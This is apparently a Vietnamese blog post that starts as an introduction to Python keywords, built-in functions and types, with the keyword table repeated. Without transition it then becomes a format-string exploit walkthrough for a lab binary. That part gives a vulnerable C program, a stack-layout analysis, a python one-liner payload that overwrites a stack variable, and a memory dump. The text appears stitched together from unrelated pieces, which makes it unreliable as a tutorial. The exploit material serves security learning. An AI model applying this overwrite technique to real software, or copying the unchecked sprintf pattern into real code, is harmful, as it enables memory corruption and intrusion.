---
layout: post
title: level_0
---

## Python hay C/C++?

C/C++: khó viết khó đọc, nhưng chương trình viết ra thường tối ưu, chạy nhanh

Python: dễ viết dễ đọc, nhiều thư viện hỗ trợ

Mục tiêu là để học và hiểu về thuật toán, nên chỉ chú trọng vào việc đọc và viết code một cách thuận tiện nhất. Vì thế, hãy sử dụng Python

## Những thứ cơ bản nhất

### Keyword

Phân loại 35 keyword. Highlight nhưng keyword thông dụng

<pre class="memory">
giá trị boolean và null:            <span style="color:aqua">None</span> <span style="color:aqua">False</span> <span style="color:aqua">True</span>
thư viện và tên thay thế (alias):   from import as
asynchronous:                       await
bắt lỗi:                            try except raise finally
logic:                              <span style="color:aqua">and</span> <span style="color:aqua">not</span> <span style="color:aqua">or</span> <span style="color:aqua">is</span>
iterate:                            <span style="color:aqua">in</span>
trả về và thoát hàm:                <span style="color:aqua">pass</span> <span style="color:aqua">return</span> yield assert
code flow:                          <span style="color:aqua">for</span> <span style="color:aqua">while</span> <span style="color:aqua">continue</span> <span style="color:aqua">break</span> <span style="color:aqua">if</span> <span style="color:aqua">elif</span> <span style="color:aqua">else</span>
định nghĩa hàm, class, và context:  <span style="color:aqua">def</span> <span style="color:aqua">class</span> lambda with
định nghĩa scope của biến:          global nonlocal
xóa biến:                           del
</pre>

### Hàm built-in

Hàm built-in là hàm có thể gọi mà không cần import từ thư viện nào. Sau đây là một số hàm thông dụng

* `abs()`: trả về giá trị tuyệt đối
* `ascii()`: trả về mã ascii
* `bin()`: trả về dạng string binary
* `enumerate()`: iterate chuỗi, trả về cả index và phần tử trong chuỗi
* `int()`: trả về số `int` của tham số
* `len()`: trả về độ dài chuỗi/string/iterable
* `list()`: convert tham số, trả về `list`
* `max()`: trả về giá trị lớn nhất của một `list`
* `min()`: trả về giá trị nhỏ nhất của một `list`
* `ord()`: trả về mã ascii dạng số
* `print()`: in ra màn hình
* `range()`: iterate một khoảng (tham số a đến tham số b)
* `set()`: convert tham số, trả về `set`
* `sorted()`: sort và trả về kết quả đã sort
* `str()`: trả về dạng chuỗi của tham số
* `sum()`: trả về tổng tất cả phần tử của `list`/iterable
* `tuple()`: trả về dang tuple của tham số
* `zip()`: dùng để iterate nhiều `list`/iterable một lúc

### Type built-in

Type mặc định của Python. Sau đây la một số type thông dụng

* `int`: trong python, số bit ko giới hạn
* `float`
* `bool`: chỉ có `True` hoặc `False`
* `list`: định nghĩa bằng `[]`; `list` trong python tương tự array, nhưng có thể chứa đa dạng và lẫn lộn nhiều kiểu phần tử (ví dụ: `[1, "2"]` vừa chứa giá trị `int`, vừa chứa giá trị `str`)
* `tuple`: tượng tự `list`, nhưng ít sử dụng hơn; có thể hiểu đơn giản là để gom các giá trị thành một cặp/một bộ giá trị
* `str`: chuỗi ký tự định nghĩa bằng `""` hoặc `''`
* `set`: định nghĩa bằng `{}`; tương tự `list` nhưng đảm bảo các giá trị trong `set` là duy nhất
* `dict`: định nghĩa bằng `{ : }`; `dict` trong python là hashtable/map trong nhiều ngôn ngữ khác; được sử dụng rất nhiều

<pre class="memory">
giá trị boolean và null:            <span style="color:aqua">None</span> <span style="color:aqua">False</span> <span style="color:aqua">True</span>
thư viện và tên thay thế (alias):   from import as
asynchronous:                       await
bắt lỗi:                            try except raise finally
logic:                              <span style="color:aqua">and</span> <span style="color:aqua">not</span> <span style="color:aqua">or</span> <span style="color:aqua">is</span>
iterate:                            <span style="color:aqua">in</span>
trả về và thoát hàm:                <span style="color:aqua">pass</span> <span style="color:aqua">return</span> yield assert
code flow:                          <span style="color:aqua">for</span> <span style="color:aqua">while</span> <span style="color:aqua">continue</span> <span style="color:aqua">break</span> <span style="color:aqua">if</span> <span style="color:aqua">elif</span> <span style="color:aqua">else</span>
định nghĩa hàm, class, và context:  <span style="color:aqua">def</span> <span style="color:aqua">class</span> lambda with
định nghĩa scope của biến:          global nonlocal
xóa biến:                           del
</pre>

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

Hàm đầu tiên được xem xét trong bài này là `sprintf`. Hàm này có tham số đầu tiên là một biến (pointer), tiếp theo là một formatted string, theo sau đó là các tham số để thay vào formatted string. `sprintf` hoạt động bằng cách phân tích formatted string đưa vào, sau đó sinh ra một chuỗi mới sẽ được lưu vào biến tham số.

Tương tự như trong các bài về exploit stack trước đây.
1. Biến `target` được lưu trên stack với địa chỉ `ebp - 0xc`. Biến này có 4 byte.
2. Biến `buffer` được lưu trên stack với địa chỉ `ebp - 0x4c`. Biến này có 64 byte.

2 biến này lắm kề này trên stack. Do đó, về cơ bản, chúng ta sẽ cần một formatted string có thể sinh ra 68 byte, trong đó 4 byte cuối sẽ chứa giá trị mong muốn của `target`. Để exploit format0, formatted string sẽ như sau.

```bash
python -c "print '%064d\xef\xbe\xad\xde'"
```

<pre class="memory">
0xbffff700:     <span style="color:springgreen">0xbffff71c</span>      <span style="color:springgreen">0xbffff978</span>      <span style="color:springgreen">0x080481e8</span>      0xbffff798
0xbffff710:     0xb7fffa54      0x00000000      0xb7fe1b28      <span style="color:aqua">0x30303030</span>
0xbffff720:     <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>
0xbffff730:     <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>
0xbffff740:     <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>
0xbffff750:     <span style="color:aqua">0x31303030</span>      <span style="color:aqua">0x31353433</span>      <span style="color:aqua">0x38323133</span>      <span style="color:orangered">0xdeadbeef</span>
0xbffff760:     0xb7fd8300      0xb7fd7ff4      0xbffff788      0x08048444
</pre>